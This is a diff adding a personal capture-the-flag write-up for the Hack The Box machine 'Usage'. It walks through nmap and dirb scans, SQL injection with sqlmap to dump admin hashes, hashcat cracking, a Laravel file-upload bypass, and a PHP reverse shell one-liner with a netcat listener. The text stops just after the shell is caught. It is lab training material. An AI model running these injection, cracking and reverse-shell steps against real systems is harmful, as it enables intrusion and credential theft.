@@ -7,3 +7,104 @@ categories: CTF
 
 
 Usage starts with a web application vulnerable to SQL injection. After a thorough enumeration, I'll use sqlmap to get a database dump with some hashes. After cracking the hash of an web admin account, I'll use CVE-xxxx-xxxx to exploit a file upload vulnerability to get a reverse shell as www. For lateral movement, I'll explore some hidden files to find a user password. I'll then use a wildcard trick to leverage a custom binary to dump a root ssh key. 
+
+
+Enumeration
+
+As usual for an easy box, I set up a basic scan of the IP
+nmap -sC -sV 10.10.11.18
+
+[pic link] -nmap results
+
+Looks like we have ports open for ssh and http. It gives us the host name, so we can add this to /etc/hosts to access the page. This is pretty typical, but I like to set up a more detailed scan to run in the background while I check out the webpage. I'll try to run directory busting too, to cover my bases.
+
+echo "10.10.11.18 usage.htb" | sudo tee -a /etc/hosts
+tail /etc/hosts
+nmap -sC -sV -p- A usage.htb
+dirb http://usage.htb/ /usr/share/wordlists/dirb/common.txt
+dirb http://admin.usage.htb/ /usr/share/wordlists/dirb/common.txt
+
+[pic link] -
+
+While that's running, I can check out the web page. Landing page is a login form. There are also links to "Register" and "Admin". "Admin" gives us a subdomain that we can add. 
+
+[pic link] -landing page
+
+echo "10.10.11.18 admin.usage.htb" | sudo tee -a /etc/hosts
+tail /etc/hosts
+
+[pic link] -admin portal
+
+Inspecting the admin page gives us version numbers for jQuery 2.1.4 and Bootstrap 3.3.5 as well as laravel_session and XSRF-TOKEN cookies. 
+
+[pic link] -inspect results
+[pic link] -inspect cookie results
+
+Since version numbers are always worth checking out, I spent some time googling the information I have so far. I found potential XSS and Prototype Pollution vulnerabilities for jQuery, but no public exploits. Bootstrap versions earlier than 3.4.1 also appear vulnerable to XSS, but it requires tooltip/popover elements. Larvel is a framework for web apps, and there are multiple vulnerabilites listed, but without the version number I can't tell which could be targets. However, I did note that Laravel is PHP based.
+
+I've now got a list of vulnerabilites I could start researching, but I'm going to finish enumerating first to keep from falling down any rabbit holes. 
+
+I try Laravel default credentials for the admin page with no luck. However, registering for the site actually works, and shows me four blog posts with a little HTB hint about Server Side Penetration testing and another pointer towards Laravel using PHP. Unfortunately, theres no additional access, and my registered credentials don't work on the admin page. 
+
+[pic link] -Blog posts
+
+At this point I circle back to my running searches. Nmap didn't return anything new, but the dirb search on admin.usage gave us /uploads, with a /images subdirectory as well as /vendor. Unfortunately I get a 403 when I try to access either of these. 
+
+XSRF seems unlikely because there are tokens in place. I try some XSS checks as well, but none of the forms reflect any outputs, so that seems to be a no-go as well. I finally get something interesting while I'm checking for SQL injection possibilities (from this list: https://book.hacktricks.xyz/pentesting-web/sql-injection)- using the ' character on the password reset page returns "500 | SERVER ERROR", which indicates it might be injectable.
+
+Firing up Burpsuite, I sent the request to the repeater, and spent some time looking through the response without gaining any additional insight. After multiple attempts, I finally got this command put together: 
+
+sqlmap -r burp.txt -p 'email' --level=5 --risk=3 v 7 --batch --dbs
+
+Which breaks down into the following:
+
+-r burp.txt: uses the http request saved as "burp.txt" (intercept in burpsuite, right click > save item)
+-p 'email':target this parameter for SQLi. Has to be blank in the request apparently
+--level=5: 1-5 level of testing to perform, 5 being most thorough
+--risk=3: 1-3 level of risk, 3 being most intrusive
+-v 7: max verbosity
+--batch: skip user input
+--dbs: enumerate databases
+
+And got 3 databases:
+[pic link] - sqlmap results
+
+I then ran the following to get the tables and dump the info of admin_users, adding in the DB type to make it run a little faster. 
+
+sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog --tables
+sqlmap -r burp.txt -p 'email' --dbms=mysql --level=5 --risk=3 -v 7 --batch -D usage_blog -T admin_users --dump
+
+which yielded a nice hash for admin.
+
+[pic link -] sqlmap hash
+
+I then used https://hashes.com/en/tools/hash_identifier to identify the hash as bcrypt, and dropped it into a text file with vim. Hashcat gets put into work next and quickly yields admin:whatever1. Good ol' rockyou!
+
+hashcat -m 3200 -a 0 adminhash.txt /usr/share/wordlists/rockyou.txt.gz
+
+[pic link] - hashcat output
+
+Worth trying over ssh, but no dice. The webpage works though, and takes us to the dashboard. The dashboard immediately gives some information, including the version of laravel I was missing earlier- 10.18.0.
+
+I spent some time playing around with the other pages, trying to add a new user, change paths in the permission section, messing with the search field, all to no avail. I finally circled back to the laravel version number and found CVE-2023-24249 along with a proof of concept here:
+https://flyd.uk/post/cve-2023-24249/. 
+
+Replicating the POC was another story. I found this part to be very particular with how and when each step was performed. I started with a text.jpg file, and found I had to hit submit in the browser, quickly intercept that request, modify the extension to .php, and quickly refresh the browser to make it accept the alternate extension. 
+
+[pic link] -admin upload pic
+
+Once I got the process nailed down, I started trying php reverse shells from https://www.revshells.com/ ("activating" by visting the files location in the /uploads/images directory I found with the earlier scan), but got no success until this one: 
+
+[pic link] - php/html shell pic
+
+Which seemed to only be able to execute php commands, and I was not able to navigate any filesystem with. So I doubled down on the php revshells, set up a listener, and inserted another reverse shell command into my malicious web page. 
+
+ifconfig 
+(grab listener address)
+
+nc -nvlp 8001
+php -r '$sock=fsockopen("10.10.14.54",8001);exec("sh<&3>&3 2>&3");'
+
+and I finally catch a shell!
+
+[pic link ] - reverse shell
